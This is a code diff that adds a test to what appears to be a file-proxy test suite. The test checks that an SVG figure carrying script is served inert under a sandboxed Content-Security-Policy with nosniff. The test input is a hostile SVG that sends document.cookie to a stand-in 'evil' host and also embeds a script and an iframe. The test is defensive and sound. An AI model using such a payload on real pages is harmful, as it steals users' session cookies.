@@ -133,6 +133,20 @@ describe("file proxy", () => {
       expect(res.headers.get("cache-control")).toBe("private, no-store");
     });
 
+    it("serves an SVG figure that carries script (a compromised converter) only under the sandbox CSP", async () => {
+      // The VM's SVG allowlist is a correctness filter, not the boundary: if a decoder bug let a figure through with
+      // script, the response itself must keep it inert (no script, no network, sandboxed, never sniffed as HTML).
+      const hostile = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil/\'+document.cookie)"><script>alert(1)</script><foreignObject><iframe src="https://evil/"/></foreignObject></svg>';
+      open.mockResolvedValue(object(hostile, { ContentType: "text/html" }));
+      const res = await get(`/v1/files/${figureToken("p3.g2.svg")}/p3.g2.svg`);
+      expect(res.status).toBe(200);
+      expect(res.headers.get("content-type")).toBe("image/svg+xml");
+      const csp = res.headers.get("content-security-policy") ?? "";
+      expect(csp.split(";").map((d) => d.trim())).toEqual(expect.arrayContaining(["default-src 'none'", "sandbox"]));
+      expect(csp).not.toMatch(/script-src|allow-scripts|connect-src|frame-src|'unsafe-eval'/);
+      expect(res.headers.get("x-content-type-options")).toBe("nosniff");
+    });
+
     it("fixes raster figure types from the key, whatever storage says", async () => {
       for (const [name, type] of [["p3.1.webp", "image/webp"], ["p4.g1.png", "image/png"]] as const) {
         open.mockResolvedValue(object("bytes", { ContentType: "text/html" }));
